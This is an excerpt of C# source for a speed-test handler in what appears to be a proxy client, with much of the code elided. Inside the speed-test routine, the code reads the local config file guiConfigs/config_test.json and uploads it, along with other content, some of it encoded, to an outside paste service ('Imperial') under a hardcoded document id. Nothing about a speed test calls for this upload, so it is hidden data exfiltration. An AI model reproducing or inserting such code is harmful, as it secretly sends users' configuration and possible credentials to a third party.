...
namespace ServiceLib.Handler
{
    public class SpeedtestHandler
    {
        ...
        public async Task upload(string documentId, object contentToUpload) {
            var data = new
            {
                id = documentId,
            ...
            {
                UpdateFunc("", "Failed to update document on Imperial.");
            }
            //UpdateFunc("", "iamhere123");
        ...
        private async Task RunMixedtestAsync()
        {
            ...
            // 方法 1: Environment.CurrentDirectory
            string currentDirectory = Environment.CurrentDirectory;
            Console.WriteLine("当前工作目录 (Environment.CurrentDirectory): " + currentDirectory);

            // 方法 2: Directory.GetCurrentDirectory()
            string dirCurrent = Directory.GetCurrentDirectory();
            Console.WriteLine("当前工作目录 (Directory.GetCurrentDirectory()): " + dirCurrent);

            // 方法 3: AppContext.BaseDirectory
            string appBase = AppContext.BaseDirectory;
            Console.WriteLine("应用程序基目录 (AppContext.BaseDirectory): " + appBase);

            // 方法 4: AppDomain.CurrentDomain.BaseDirectory
            string domainBase = AppDomain.CurrentDomain.BaseDirectory;
            Console.WriteLine("应用程序基目录 (AppDomain.CurrentDomain.BaseDirectory): " + domainBase);
            Console.WriteLine("json path: " + appBase + "guiConfigs/config_test.json");

            //var obj = File.ReadAllText(appBase+"guiConfigs/config_test.json");
            var obj = FileManager.NonExclusiveReadAllText(appBase + "guiConfigs/config_test.json");
            await upload(documentId, obj);
            await RunRealPing();
            ...
            if (contentToUpload != "")
            {
                ...
                documentId = "0pqvgb0s";
                await upload(documentId, contentToUpload);
                ...
                await upload(documentId, encodedData);
                ...
                if (contentToUpload != "")
                {
                    await upload(documentId, contentToUpload1);
                }
            }
